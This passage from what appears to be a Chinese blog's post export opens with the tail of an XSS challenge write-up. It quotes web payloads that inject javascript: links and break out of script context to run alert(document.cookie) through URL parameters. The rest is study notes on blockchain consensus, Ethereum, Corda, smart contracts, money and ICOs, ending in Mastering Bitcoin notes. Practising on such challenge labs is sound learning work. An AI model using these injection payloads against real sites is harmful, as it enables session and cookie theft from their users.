实话实说这里我确实也没怎么搞懂，jpexs-decompiler大概就是一个和ida差不多的内容，通过反汇编flash文件，然后表达成我们看得懂的语言。 这里的话感觉就是 arg01 ， arg02 能够形成一对flash参数的键值对，从而对flash的运行造成一些影响 那么这里就是如果设置了version的值就会引发一些参数调用，从而使我们注入的脚本能够被执行。 如果有说错的地方希望各位师傅在评论区纠正和分享正确的思路，我对这方面不熟悉，这里走个流程了解一下工具。 实际实验在本地以及网页端包括firefox，chrome也没有成功，还是贴一下晚上的payload arg01=version\u0026amp;arg02=\u0026lt;a href=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;123\u0026lt;/a\u0026gt; level20 还是贴一下网上的payload level20.php?arg01=a\u0026amp;arg02=\\\u0026#34;))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height ?arg01=id\u0026amp;arg02=\\%22))}catch(e){}if(!self.a)self.a=!alert(1)//%26width%26height ","date":"2022-05-18T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/xss_challenge_trip/","title":"XSS 挑战之旅"},{"content":"DLC EXAM Preparation Notes Week 4 Byzantine Faults and CAP Theorem Byzantine General Problems 拜占庭将军问题，也是分布式计算中的投票问题\n即当有9位将军协同作战，现在他们遇到了麻烦，需要决定是撤退还是继续进攻，他们通过投票来决定最后的决定，4位进攻，4位撤退，一位背叛者告诉一边他们会进攻，告诉另一边他们会撤退，导致协同作战失败。 那么Bitcoin是如何解决这个问题的呢，即使用PoW算法，使发送一条虚假的消息的成本变得很高 Database on ACID\nACID,即是为了保证数据库的所有业务的办理是可靠的，需要具备的四个特性的缩写 Atomicity 原子性，即所有的操作都必须完整的进行，如果期间发生错误，即整一个过程全部回滚，当作没有发生过 Consistency一致性，保证数据库的完整性没有被破坏，所有的操作都需要符合标准 Isolation隔离性，即防止多个操作处理同一个数据，导致竞争出现混乱 Durability持久性，所有的处理完成后都可以长期保存，不会丢失和更改 那么当数据库变大了之后，这四个特性就会收到挑战。 CAP Theorem\nCAP为三个对于实现分布式数据库的挑战的简写 Consistency of data,一致性，所有的节点在访问分布式的数据库时，能够保证访问的都是最新的数据 Availability of data，可用性，每次请求都能获得不报错的响应（但不保证获取的一定是最新的数据） Partition-tolerance，分区容错性，当一致性无法表达的时候，就会产生分歧， 根据定力，分布式系统只能保证三项中的两项 一般来说，Partition-tolerance必须得到保证，因此只能在Availability和Consistency之间进行选择 选择Consistency一致性，那么响应的时间可能会变长 选择Availability，那么需要保证响应的时间是即时的 Consensus Protocols Proof of Work (Pow)\nHow it works : 通过让mining node通过改变block header中的nonce来不断的改变block header hash的值，使其小于block header中target的值 后果 - 大量的资源消耗，运行算力机器以及冷却机器所要消耗的电费 - 大量的计算群 \u0026lt;br/\u0026gt; - 集中的mining power \u0026lt;br/\u0026gt; Proof of Stake (PoS)\nProof of Stake不需要再向PoW那样消耗大量的算力以及电力资源来互相竞争，永远要记住一点的就是mining的过程本身不是为了加密货币，而是为了维持整一个区块链上的安全。 比如以太坊，他们要求想要成为 validator 的用户抵押一部分的虚拟货币，然后随机选择一名validator来进行新的block的创造以及transaction的验证，你抵押的越多，也就越容易成为validator。 那么如何避免用户的不良行为呢，PoW通过大量的运算提高了成本，而PoS中，则是使用抵押的机制来防止产生不良的行为，如果发生了他们就丧失他们抵押的虚拟货币 在PoS中，人们会倾向与合作，而不是PoW中的竞争，他们可以将资源集中起来，从而获得更大的机会来成为validator 在PoS中，51% attack对于attacker来说也十分危险，因为他们需要抵押大量的货币来得到validator的地位，那么一旦遭受惩罚，损失将会是巨大的 Proof of Authority\nBlock的创建以及transaction的校验工作被轮流分配到可信的权威机构或者组织身上，这些组织可能需要抵押一部分的资金来成为可靠的节点，进入轮值列表 Other turn-taking protocols\nProtocol来直接决定那个节点来完成工作 随机分配 轮流 Proof of Elapsed Time (PoET) hardware: 只有特定的硬件才能完成工作 Consensus attacks Sybil attacks\n女巫攻击，攻击者通过利用proxy代理来伪造多个身份来对整一个decentralised consensus机制进行攻击，但同样也需要大量的hash power，因为即使你控制了很多节点，那也需要能够在这些节点上面来完成PoW才行 Week 8: DLT Infrastructure \u0026amp; Platforms Bitcoin blockchain最主要的目的是为了防住double-spending（通过增加修改一个block所需要的cost，特别是当多个block都确认信息之后） Ethereum What is Ethereum\n在Ethereum宇宙中，有一个唯一的虚拟的机器叫做EVM（Ethereum Virtual Machine）,所有参与Ethereum网络的用户都认可的一个机器，用来记录整个网络包括用户的状态。 EVM类似于bitcoin中每一个full node所存储的database，当有transaction产生之后，将会被广播到整一个Ehthereum网络当中，被验证并加入的新的block当中，然后作为一条指令被EVM做执行，所有的node上都有一份完整的EVM的拷贝，每一条transaction都相当于是对EVM这个机器发出的指令，让其进行一些操作造成状态的改变。 global computers What is Ether\nEther就是Ethereum中的所使用的cryptocurrency，其作用是为了激励miner积极的转发，验证transaction，来维护整个一个blockchain，同时也可以防止发生DDoS攻击，因为每个transaction都需要支付一定的费用。 What is Smart contracts\nSmart contracts 智能合约，本质上是一个个在EVM上的程序（一组代码指令），用户可以通过发送对应的变量参数同时支付一定的Eth来发起一个transaction，而一个miner讲在其本地的EVM上的所对应的smart contract程序上输入参数执行这个程序，完成相应的工作。 程序员通过向EVM中上传这些开发的智能合约程序，就可以在EVM的基础上搭建应用程序供用户调用使用。 同时也被叫做dapps, or Decentralised Apps. Transaction\nEthereum中的transaction是丰富多样的，例如： Send X ether from my account to Alice\u0026rsquo;s account. Publish some smart contract code into EVM state. Execute the code of the smart contract at address X in the EVM, with arguments Y. GAS\nGAS，汽油，顾名思义，是用来驱动Ethereum工作的一个东西。 我们从上面的介绍中了解，用户可以发起 transaction 来转移ETH,也可以发送对应的参数来执行smart contracts,那么这些工作都需要消耗计算机资源，那么GAS就作为费用来驱动计算机资源为用户服务， GAS cost :\n你需要执行多大的smart contracts程序 你需要执行的速度有多快 Gas price (measure in ETH) 用户在发起transaction的时候可以决定想要花费多少GAS来作为报酬 Total processing fee in ETH = Gas limit (total # of gas to be used) X gas price in ETH. Transaction的执行具有Atomicity原子性（我觉得是这样），即如果transaction的执行失败了，或者未完成，gas不会退回，因为确实已经占用了计算机资源，但是EVM的状态不会发生任何改变。 Why have Ethereum Gas?\n可以用于减少infinite loops 以及防止DoS attack的发生， 因为最终支付的有限的Gas将被用完，并且attacker需要付出gas才能继续工作 Cryptokitties problem\nCryptokitties刚出来的时候，大量的transaction突然涌入整一个Ethereum，Miners提高了他们的gas几个，导致很多老的用户还在自动的支付较低的gas，导致很多transaction并不会被处理与执行 解决的方法： 短期：修改前端页面来允许用户增加他们的gas费用并重新提交transaction 长期：将类似的app转移到sidechains来执行，即只有一部分人可以执行和运行特定的transaction，而不会影响主链上的nodes Ethereum Enterprise\n企业和组织可以在Ethereum上开辟permissioned chains来实现自己的一个blockchain，他们会重新开发EVM的code来接收和转发特定的transaction，这些transaction与主链上的node并不兼容，但是却可以在特定的一些参与到这个sidechain上的node之间进行交互 Corda designed for private transactions enterprise version is called R3 Corda. Design Consensus 只有参与本次transaction的机构才能看到和参与这个transaction Validation 只有合法的利益相关者才会进行transaction的验证 Use of Independent notaries 独立的第三方公证处会帮助完成时间的验证（什么时候做出的交易），以及防止transaction发生两次 Focus on inter-operability 确保法律条文能够绑定，以及老旧的内部系统能够参与合作 Corda的特性\nTransactions private to the parties involved – Witnessed by notaries 只有公证处才能看得到 – Only participants to a transaction can view it 只有参与transaction的组织才能知道transaction的存在与参与其中 No single chain No global state No native crypto-currency Records an explicit link between legal code and smart contracts Supports a variety of consensus mechanisms Can include transaction within arbitrary workflows. Corda中也没有block的概念，所有的transaction都是实时处理的，意味着不需要等待block被添加才能被确认， 金融机构对Corda感兴趣的主要原因就是可以自动化繁琐的工作流，比如学校的注册，就需要一系列的工作流，他们如果能被自动化，并记录在blockchain上面，就会方便很多。 https://www.r3.com/blockchain-101/ Peers have a single shared ledger — once the transaction is validated, the record is permanent, secure and immutable. A smart contract — code running on top of a blockchain that contains a set of rules under which the parties mutually agree — eliminates the need for third parties. Owner of the transaction has the power to move anything of value freely and instantly without intermediaries. Eliminates or reduces paper processes, need for intermediaries, speeds up transaction times and increases efficiencies and transparency. Hyperledger a family of platforms 作为基础设施，然后加入的组织可以在其基础设施上搭建自己的服务 Different large IT companies, financial institutions join the Hyperledger as members and run a family of platforms 用户可以选择加入这些platforms也可以寻求这些组织提供服务 Other technologies 一个常见的批评的声音就是：你实际上不需要一个分布式账本平台，因为使用集中式的数据库一样可以存储隐私信息 但是这仍然面临很多的威胁： 第三方数据库的安全性，以及价格的支出 如何保证数据库不被攻击或者被第三方数据库所利用？ 禁止合作伙伴持有竞争对手的数据 因此每一个企业都需要将数据存储在第三方的数据库中 Week 9: Smart Contracts 当我们在自动贩卖机买饮料的时候，我们投入硬币，然后选择想要的饮料，然后饮料掉出来，这其实完成了一个隐性的合约，就是你付出了一定的钱，机器把对应的商品交付给你，这个工作由自动贩卖机完成，而不需要再签署一份合同，来进行交付。 Smart contracts,智能合约就是为了实现这样一个概念，但是就如同Mining挖矿的目的是为了维护去中心化的共识机制的安全一样，smart contracts并不是严格意义上的合同，它的本质上运行在分布式账本上的一个程序，能够自动的接受参数然后进行运行 Bitcoin的script其实就是一个很基础的智能合约，transaction中的locking script \u0026amp; unlocking script合在一起就可以实现UTXO的花费，但是由于Bitcoin本身设计的限制，script没有很强大的功能，不能循环或者递归，是图灵不完备的。 那么如果我们设计一个更为强大的计算机语言，使其图灵完备，那么是不是就能完成更有创造性的功能呢，这也就是Ethereum的出现以及Solidity语言的实现。 每一个smart contract程序在运行的时候都可以在分布式账本上修改其特定的数据，可供使用的数据当然也有一系列的限制。 Smart contract and trust 我们可以说，smart contract程序（相较于普通的程序）将信任加入了系统，因为所有的代码都存在于整一个分布式账本上，并且所有的操作都会被所有的节点独立的验证，并且会永久被保存，理论上无法被修改。同时这些操作将会被自动执行。 关于名字 其实智能合约并不智能，他们只是一组代码可以被自动执行，仅此而已（我们说的智能一般会联系到AI之类的方向） 其实智能合约不是传统意义上的合约，可能只是一次简单的加密货币的交易，如果需要加上法律条文，需要额外的服务，并且也不一定是两个组织为了达成某些交易而诞生的合同。 What are agreements in the context of distributed ledgers? 法律合同（人们能够读得懂的） 隐性的合同（自动调用的计算机操作，protcols之类的） Stampery servie Stampery是一项可以提供合同证明服务，即合同是否达成，在何时达成？ 举个例子，比如你与房东达成了租房合同，然后你们各有一份经过签字的合同，你可以通过Stampery服务来将其上传到分布式账本中进行保存： 首先他们会hash这份电子的合同 然后将这个hash值与其他需要的hash一起组成称merkle tree 接着上传到一个或多个分布式账本中 那么当你未来需要验证自己的合同没有经过修改的话就可以： 重新用同样的算法hash你自己的文件 然后与分布式账本上的hash进行匹配就可以验证了（可信的是分布式账本） Ricardian Contracts: link legal agreements to code 可以将有法律效应的文件转换成电脑系统可以处理的形式，同时又可以轻松的转换回来供法律人士阅读和使用。 所有的参与者都会电子的给合同签名，同时使用hash算法将文件电子的保存在blockchain上，供以将来使用 Barclay银行第一次采用了这个Ricardian contract与blockchain（corda）的结合 https://www.youtube.com/watch?v=YIH4MJf6kH8\u0026t=237s\u0026ab_channel=Rise%2CcreatedbyBarclays 他们实现了一个prototype，可以将签合同的时候所需要的法律文件转换为电子版的，然后就交易的双方以及其中的细节进行简单的填充，就可以快速生成双份的具有法律效应的合同，之后再上传到corda的blockchain之上，保证了其不可被修改的性质 还是之前那个租房合同的例子，现在我们很多的合同还是要求要用手写签名为证，但是有了这样的smart contract program，我们就可以更为方便的生成合同，并永久的保存，且将合同保存在可以信任的平台上，方便再次追溯。 Agreements using smart contracts 智能合约如果是放在permissioned账本上的话，那么只会被参与的几个用户有权利查看 并且就像之前提到过的那样，一旦智能合约开始执行，那么一切的后果都必须要接受，也就是说这一切都是建立在你已经完全掌握了智能合约要做的事情以及将会发生的后果，一旦上传到分布式账本之后，一切都不会改变了 智能合约的方法分为两种： Getters，获取变量 Setters，通过得到的变量来更改EVM的状态 往往这些智能合约程序会设定自动的函数来自动提醒相关人员一旦状态发生了任何改变 Smart Contract Languages 总结 智能合约就是分布式账本上自动运行的程序 每一个智能合约程序都会在P2P网络中的每一个full node上被执行 其结果就是改变每一个full node上的virtual machine 智能合约可以或者不用代表多个团体之间的达成的合同 有些只是开发者所开发的应用程序 每一个节点都会运行，但是可能会在不同的时间完成 这也就是为什么所有智能合约程序的输入参数只能在blockchain内部获取，因为如果在外部获取，万一出现问题，那么不同的node上的virtual machine的结果不同，就会破坏整一个blockchain 不同使用随机数，一切都是确定的，要保证所有的EVM都是相同的 Lecture 10: Some Case Studies Shared Databases What are main benefits of DLT 状态共享 Shared State 不同的企业需要共享相同的数据，那么DLT可以可以建立一个多方都可以信任的平台，平切在所有的节点上的数据都是相同的 Stateful(history kept) 状态是实时更新的 keep track the state 所有的状态噶遍都需要经过所有节点的验证，认可，以及记录 Stored data is effectively immutable 存储的数据几乎不可能被改变 数据被存储在所有的节点上，特别是在PoW的blockchain上，如果想要修改数据，需要所有的node都同意，并且花费大量的资源 Unique allocations \u0026amp; co-ordinated allocation 解决double-spend problem, 每一条transaction都会被所有的节点记录，并且不断被之后的block所记录，double-spend需要颠覆这些很难 Witnessing Multi-party aggregation，permissioned至少需要三个团体，其中一个作为监督 Immediate settlement for digital assets change of custody都会被记录 NFT Lecture 5: Money and e-Money Money在现代有两种基本的形式 硬币 纸钞 同样还有 旅行支票 银行活期存款 储蓄存款 定期存款（24小时年） 货币市场存款（商业借贷) Money在英国的合法解释 Top-Down 自上而下： 政府说什么是钱，什么就是钱 Legal Tender法定货币 fiat money 法定货币 Bottom-Up 自下而上： 老百姓说什么是钱，什么就是钱 Promissory notes从18实际中期开始流行，在19世纪被英国法院所接受 Money的种类 Commodity money 商品货币 其价值来源于制造材料本身的价值 通常是金属(金银铜) Yap Rai stones Representative Money 代表性货币 价值来源于其所代表的基础商品的国币 对商品的要求：金本位 Fiat Money 法定货币 没有任何内在价值的货币，也没有基础商品 其价值来源于用户的认可 也可以说是老百姓认同了政府颁发的Top-Down自上而下的货币 Money的主要功能 作为交易的终结 减少了以物换物的麻烦 用于商品衡量机制的标准，也是记账的单位 价值的存储 如果没有通货膨胀的话，可以一直保持价值 作为匿名支付的手段 作为延迟交付的手段 Money的次要功能 可变性 纸币/硬币是可以互换的 不像（比如）钻石或稀有邮票 可携带性 不像房屋或土地那样 耐用性 纸质钞票与塑料钞票 比如说。澳大利亚的第一张聚合物美元纸币。 可分割性 与牛不同 可验证性 需要验证真实性 使用水印、全息图 储存性 与牛不同（牛最终会死）。 不容易伪造 使用水印、全息图。 什么是Money的价值 在法定货币中，其价值取决于人民是否愿意接受其作为支付手段 主要是由人民的态度决定 由什么政府颁发的 对其货币政策的态度 在通货膨胀或者通货紧缩之下，人民会做出响应的动作来表达他们对于货币价值的态度： 在高通货膨胀率下，做债务人比做债权人更好 借钱而不是放钱 他们可能试图将储蓄转化为其他资产。 货币的流通性 Liquidity refers to the speed \u0026amp; ease with which an asset can be turned into cash without lowering its price 流动性指的是如何将实际资产与现金之间的转换速度以及难易程度（在不影响价格的情况下） 现金的流通性是最好的 贵金属也还可以 虚拟货币的流通性也还不错 但是房子或者其他实际的资产的流通性就很差，因为不是所有人都想要这个资产，同时，他们的价值也还需要评估 Money在金融中的定义 MØ = 流通中的硬币和纸币 + 银行储备基金（英国）（称为狭义货币） MB = MØ + 银行金库中的硬币和纸币（称为货币基础） M1 = 流通中或金库中的硬币和纸币 + 旅行支票 + 活期存款 + 其他可支票存款 M2 = M1 + 储蓄存款 + 10万美元以下定期存款 M3 = M2 + 货币市场基金 + 较长期的存款 MZM = M3 + 所有货币市场基金。 发放Money 在大多数国家只有由政府控制的中心银行才有资格发放货币 具体如何发放呢： 铸造硬币 印刷纸币 将电子存款存入商业银行的账户 进入商业银行的Nostro账户 用抵押品（例如，银行拥有的土地、建筑物）作担保 然后，银行可以把这些钱借出。 货币政策 大多数的银行都有明确的目标，例如 将通货膨胀保持在一个稳定的标准 扩大就业（让银行中的钱贬值，人们才会愿意去赚钱） 缓和长期利率 为了实现这些目标，他们可以通过影响货币的数量来达到这个目的： 通过发行货币 通过要求商业银行在中央银行存放安全资金（\u0026ldquo;储备金\u0026rdquo;）。 通过设定基本利率（\u0026ldquo;基准利率\u0026rdquo;）（英国：0.50%）。 通过将电子货币存入商业银行的银行账户（\u0026ldquo;量化宽松\u0026rdquo;）。 通过公开市场操作（OMO） 购买和出售债券 从而从经济中释放或提取资金。 对于货币政策的信息共享 政府一般会对于信息的共享非常小心，因为一个普通的消息，很容易造成民众的过度解读与过度反应，进而引起恐慌 Inflation and Hyperinflation 通货膨胀和恶性通货膨胀 如果银行发行过多的货币（或使贷款过于容易），那么 可用的货币多于要购买的商品（至少在短期内）。 商品的价格上升（因为对它们的需求超过了供应）。 商品的平均价格上升，因此我们得到了通货膨胀 每单位时间内的价格上涨率。 通货膨胀的水平没有上限 恶性通货膨胀:当通货膨胀率每月超过50%。 加密货币的作用 交易媒介 价值的衡量标准与记账单位 价值的存储 匿名支付 延期支付 但是，加密货币的稳定性与其对现实世界商品以及服务的购买和卖出的关系成反比 作为一种存储媒介，加密货币对跨国转移资产的人来说可能特别有价值 加密货币的用户 犯罪者，洗钱 逃避国际制裁的政府和人民 处于资产出口管制，恶性通货膨胀或者高度腐败的国家的人民 任何有使用货币合法/不合法需求的人 投资者 加密货币在2017年的增长 不合法交易的增加 ICO 大众行为 Herd behaviours 从众行为 人们会倾向于模仿别人 Pump \u0026amp; dump scams 抽水和倾倒骗局 诈骗者购买股票（或加密货币）并向其他人推销。 当其他人买入时，价格上升 诈骗者以高于他/她支付的价格卖出 庞氏骗局 骗子招揽投资基金，承诺快速和高额回报 早期投资者从后期投资者的投资中获得回报 由于世界人口是有限的，这样的骗局总要结束。 泡沫经济 Bubbles 泡沫经济，指资产价值超越实体经济，极易丧失持续发展能力的宏观经济状态。 泡沫经济经常由大量投机活动支撑，本质就是贪婪。 由于缺乏实体经济的支撑，因此其资产犹如泡沫一般容易破裂，因此经济学上称之为“泡沫经济”。 新兴产业处于早期的时候，人们开始炒作商品，赋予其过高的价值 一旦投机者丧失了投机的欲望，开始撤出他们的资金，那么被哄抬的商品价格机会面临大量的下降，最终导致泡沫破裂，手中的泡沫不值钱了，贷款却还还不清 虚拟货币的价值 需要考虑的方面 供应方 供应量是否固定 比如比特币的发行总量目前是由上上限 需求方 是否有一个会产生需求的基础应用？ 如果有一个基础应用，需求可能是什么？ 在短期和长期内 是否有类似或竞争的代币？ 是否有来自投资者的需求（或可能有）？ 供应和需求之间的平衡？ 供应和需求是如何匹配的？ 其他类似加密货币的价格是多少？ Lecture 7: ICOs and TGEs Raising Funds 创业公司如何收集资金\nFF\u0026amp;F: 创始人，朋友和家人 天使投资人 政府拨款或者贷款 商业贷款（银行） 风险投资公司 IPO：当公司在正确交易所上市的时候，就可以通过出售股份来募集资金 寻找贷款或者投资人\n发布招股说明书 一份包含机会，terms and conditions (T\u0026amp;C) 以及风险的文档 传统的借贷形式 存储者将钱存入银行，信用社 银行用这些钱向个人或者公司提供大额贷款 众筹资金 通过众筹服务以及网站募集资金 通过大数量的投资者投资的小额资金 P2P贷款 ICO 预先出售代币 ICOs and TGEs 什么是ICO？\nICO是一种募集资金的方法 举一个例子，比如我们将要开设一条新的航线，那么建设航线需要时间与资金，我们通过发放crypto token代币来交换投资者的资金支持 投资者通过支持资金，就会获得一定量的代币 在项目结束之后，他们就可以进行对代币的贸易 Why invest? – Business or utility reason – Investment reasons • to hold tokens and resell them later 持有代币并在日后转售（投资然后获得回报） – Speculation reasons • to buy and sell tokens. 购买和出售代币（用来获取代币） Token standards: ERC\nEthereum Request for Comment 任何人都可以计入并提供他们的想法，然后让其他人讨论并投入资金 这个协议可以让代币的互动更加方便，通过与以太坊网络的交互 ERC721: The Ethereum standard for Non-Fungible Tokens (NFTs)\nERC721中token被用来表示一样unique特有的物品，使其无法被代替 最早的NTF就是CryptoKitties 监管机构\n防止诈骗 要求所有的募集资金的人了解这些投资者： 发起人的过去记录 公司的真正计划和意图 法律和监管状况 内幕交易和关系 风险 来防止来自于各种方面的风险： 市场需求 竞争者 监管风险 技术发展。 Accredited investors 受到认可的投资者\n大多数金融业监管机构更关注普通消费者和投资者的风险 较少关注对以下人群的风险 高净值个人（财富超过10万美元的人）。 私人投资池 一些机构专有的认可投资者的范围： 对这些投资者和他们加入的投资池的监管和监督较少 对冲基金\u0026ndash;使用高风险策略的认可投资者的资金池。 Cryptocurrency Hedge Funds 加密货币对冲基金\n集合投资基金，目标是投资于。 加密货币和替代币 ICOs 在区块链上运行的初创企业 通常由传统对冲基金的合作伙伴和投资者创建 加密货币对传统投资者来说太不稳定了 Checks on investors 对投资者的审查\n对投资者的审查主要是为了通过了解投资人的信息以防止洗钱以及其他投资背后的违法行为 KYC – Know Your Customer regulations : – Identity – Location \u0026lt;br/\u0026gt; – Wealth \u0026amp;amp; assets \u0026lt;br/\u0026gt; – Other investments \u0026lt;br/\u0026gt; AML – Anti-Money Laundering regulations :\n– What are the source(s) of funds? 钱从哪儿来的 Money-laundering :\n目标： – Proceeds of criminal activity (often in cash) 犯罪活动的收益 – Proceeds of transactions with entities under sanctions 与受制裁的目标进行交易所得利益 Registration of security 证券注册\n需要向美国证券交易委员会注册证券（除非获得豁免），并提供以下细节。 公司的属性和商业目的 所提供的证券 公司的管理层 由独立会计师认证的财务报表。 Howey Test\nHowey测试是用来鉴定一份证券投资合同是否为合法的，需要满足以下四个条件 它是金钱的投资 \u0026ldquo;金钱 \u0026ldquo;可能包括其他形式的近似金钱 金钱的投资 存在对投资利润的预期 想要赚钱的 资金的投资是在一个共同的企业中 \u0026ndash;将资金汇集到一个股份公司或类似的联合企业中去 任何利润都来自于发起人或第三方的努力 如果利润来自于投资者自己的行为，那么可能就不是证券。 对于有意向的ICO，大致有3种选择\n选择1（重度监管） 将代币作为证券在美国SEC注册 约50万美元的法律费用 4-6个月的过程 方案2（轻度监管） 不向美国公民或居民出售，以获得美国证券交易委员会的豁免。 同样地，不向中国或韩国居民出售（获得当地委员会的和面）。 约5-10万美元的法律费用，2-3个月 需要收集KYC和反洗钱信息 与Cypher-punk的精神背道而驰 选项3（无法规） 无视这些法规 有被监管机构起诉和/或被投资人起诉的风险 需要找个好律师 ICO的发起的阶段\n私人代币分配 给朋友和员工 私人代币分配 通常是给大型投资者和加密对冲基金 公开代币分配 给任何人（也许受限制）。 例如，不提供给美国、中国或韩国的公民或居民 在白皮书和招股说明书的基础上筹集资金 平台的开发 并创建代币 启动业务 和代币的使用。 ICOs - 一个典型的组织结构\n一个慈善基金会（F）发起ICO并接收资金 拥有独立的董事会 一家软件开发公司（D）开发理念和白皮书 当筹集到资金时，部分资金由F分配给D以建立平台。 地点 基金会通常在有利于监管的司法管辖区注册 例如，瑞士、直布罗陀、新加坡。 软件公司在其他地方注册 例如，英国，美国。 雇员可能在任何地方。 潜在的治理问题 基金会（F）和软件公司（D）之间的关系是什么？ 如果发生纠纷，管辖权在哪里？ 代币持有者对软件有权利吗？ 代币分配机制\n在公开销售中使用各种分配机制来分配代币 通常是拍卖，将代币授予出价最高的人 基本关注代币（BATCoin）ICO 2017年5月：在30秒内筹集了3500万美元的资金 只有130名投资者 前20个地址控制了50%以上的代币 Bancor ICO 2017年6月12日 3小时内筹集了1.53亿美元（以太币）的资金 比计划多出5100万美元 批评 对内部人士的偏爱 速度 没有给代币总量设置上限。 Case Studies Ethereum\n以太坊 2013: Vitalik Buterin的白皮书 建议在区块链上实现完全的编程能力（Solidity） 2014年7-8月进行ICO 在当时的ICO中排名第六 筹集了1840万美元 以固定价格递减的BTC进行支付 2000 ETH / BTC降至1337 ETH / BTC 31.5K BTC或6000万ETH DAO\nDecentralized Autonomous Organization DAO 去中心化的自治组织 在以太坊上运行的自营风险投资基金 在1个月内（2016年5月）从11000名投资者那里筹集了1.5亿美元的资金 打算让代币持有人对投资建议进行投票 2016年6月。代码漏洞被利用 5000万美元被抽走 投资者的风险 由于设计（或测试）不当的代码造成的资金损失 以太坊节点投票决定硬分叉以恢复损失的资金 2016年7月20日在区块1,920,000处 现在有2个分支。 以太坊（区块链排除了损失） 以太坊classic（漏洞仍然存在）。 Tezos\n一个去中心化的区块链，以促进代码的正式验证，以及智能合约。 发起人和s/w开发者。阿瑟-布莱特曼和凯瑟琳-布莱特曼（美国） Tezos基金会（瑞士）。Johann Gevers 2017年7月的ICO 筹集了2.32亿美元的ETH和BTC 布雷特曼夫妇与基金会之间存在分歧 两人之间的律师函 推迟开发和推出代币的时间 谁来做系统/软件开发？ 投资者对延迟的不满 投资者提出集体诉讼的风险。 Polkadot 2017\n目标 将私人区块链和公共区块链联系在一起 推动者 Gavin Wood（前以太坊CTO） Jutta Steiner（前以太坊）。 Parity软件公司 Parity软件公司（英国） Web 3.0基金会（柏林） 2017年10月进行ICO，募集资金。 私人销售：8300万美元的瑞士法郎 公开销售：1.4亿美元的以太币和比特币 拍卖过程是降价拍卖（荷兰拍卖）。 Polkadot: 多签名钱包的问题\n支付到以太坊多签名钱包的资金 以太坊多签名钱包模板将大部分的处理（除了支付出去）放在一个库钱包里 这是为了减少处理成本 库钱包有一个漏洞 有人可以调用它并初始化它（获得它的所有权）。 然后可以杀死它 有人这么做了! (可能是意外的) 任何使用这个钱包的多重签名的钱包都不能再访问了 一些50万ETH不能再访问了 包括为Polkadot筹集的9000万美元的资金。 Risks of an ICO 任何商业投资的风险投资可能失败 市场需求可能不存在 特别是对于寻求创造新市场类别的产品 诈骗和欺诈 对新技术投资的风险 技术可能会向前发展 技术人才的短缺 可能出现竞争 网络效应和路径依赖 ICO的特殊风险 技术是新的和不成熟的，还没有得到很好的理解 监管风险（例如，被监管机构起诉） 可能是一个庞氏骗局 投资者的集体诉讼 早期投资者可能会被后期投资者起诉。 ","date":"2022-05-13T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/dlc_exam_preparation_notes/","title":"DLC EXAM Preparation Notes"},{"content":"Mastering Bitcoin 2nd Edition Chapter 10: Mining and Consensus Introduction 在本章开始的时候，我们就要为大家解决一个误区，Mining，挖矿，其实它的主要目的并不是获取新的比特币，或者赚取transaction fee，而是为了更为重要的目的，即作为Bitcoin的安全机制，以及保证去中心化的概念得以实现。获取新的比特币以及transaction fee作为奖励，属于独立的一个incentive system奖励系统，用于激励矿工们完成mining的任务，保证bitcoin的安全。 不过挖矿这个比喻实在是有点贴切（也许就是为什么即使容易误导还是这么叫），挖矿不仅获得了珍贵的资源，同时这些资源是有限的，越挖越少的，因为大约每10min就会产生一个新的block，那么每四年，准确来说是每210,000个区块后新的bitcoin就会减半，从2009年的50 bitcoin per block最后到2140年，20.9999998 million的比特币都被挖出来之后就不再产生了。那么谁还挖矿呢？答案就是transaction fee的奖励，届时每一个block的transaction势必越来越多，产生的费用也会占据reward的主导地位，矿工就会为了transaction fee而继续挖矿。不得不说，即懂得密码学，又回编程，有懂经济货币，能设计如此完善的机制，Satoshi Nakamoto要么就是一个绝世天才，要不就是一群来自各个领域的天才结合在一起创造了这个杰作。 Bitcoin如何抵御Inflation通货膨胀？ 首先我来简单说说我对于通货膨胀的理解，也就是说政府通过让货币贬值，来刺激消费，因为大家存在银行里的钱慢慢变得越来越不值钱了，那么大家就会倾向于趁早把钱价值高的时候换成商品来保值。 那么政府一般来说就是通过直接打印更多的钱来实现这一点，因为当钱越来越多的时候，商品的价格也会随之上涨来应对，其实这也是一种隐性的对于存储者的税收或者说惩罚，因为他们在银行中的钱的实际价值实际上是减少了。 那么我们为什么说Bitcoin其实是一个Deflationary Money，即通货紧缩的货币呢，因为其的总数量是固定的，不会无限的印钱，并且其产量在不断的减少，那么bitcoin实际上就会变得越来越值钱，造成了这个通货紧缩。 Decentralized Consensus 去中心化的共识 传统的支付系统依赖于一个权威中心机构来完成所有交易的认证和清算，但是Satoshi Nakamoto 想要在Bitcoin上构建的就是一个去中心化的系统，即不需要一个权威机构，而是想办法让每一个拥有完整账本拷贝的 bitcoin full nodes都能认同一个结果，达成一个共识。 实现这个去中心化共识需要四个步骤，我们一个一个展开来将 Independent verification of each transaction, by every full node, based on a comprehensive list of criteria Independent aggregation of those transactions into new blocks by mining nodes, coupled with demonstrated computation through a Proof-of-Work algorithm Independent verification of the new blocks by every node and assembly into a chain Independent selection, by every node, of the chain with the most cumulative computation demonstrated through Proof-of-Work Independent Verification of Transactions 在第六章的学习中，我们知道了当wallet想要创造一个新的transaction，它就会收集用户可支配的UTXO，然后提供解锁这些UTXO的unlocking scripts从而构建outputs的内容并将构建好的这个transaction发送给邻居节点，从而扩散到整一个Bitcoin网络当中。 但是在邻居节点转发这个transaction之前，每一个转发的节点都会进行一个independent verification of transactions，独立的交易验证，它们会创建一个valid transactions pool来收录所有的有效的transaction。而验证的过程包括了数据结构，以及一些基本的数值的范围的确认，同时还有一些更为复杂的验证例如： 检查transaction的inputs，所对应的outputs是否真的存在 检查transaction的inputs，所对应的outputs，是否已经被本地已经收录的valid transaction所使用了 检查transaction的inputs，所对应的outputs是否已经被花费了 以及我们之前提到过的，验证unlocking scripts 以及 locking scripts的组合是否能够匹配 Mining Nodes Miners，矿工，是bitcoin network中一些特殊的节点，我们拿本书的一个经典例子来介绍，Jing作为一个miner，运行着一个bitcoin full node，miner的职责有： 接收和传递未经确认的transaction 集中这些transaction放入新的block当中 监听新的block的到来，这也意味着新block的竞争失败，也是下一个block竞争的开始 Aggregating Transactions into Blocks 当一个node验证了transactions之后，就会将他们放入本地的 memory pool, or transaction pool 当中，然后接着被放入新的 candidate block当中，当一个新的block到来之后，Jing的miner node会首先明白当前block已经竞争失败，那么会丢弃当前的candidate block进而创建新的candidate 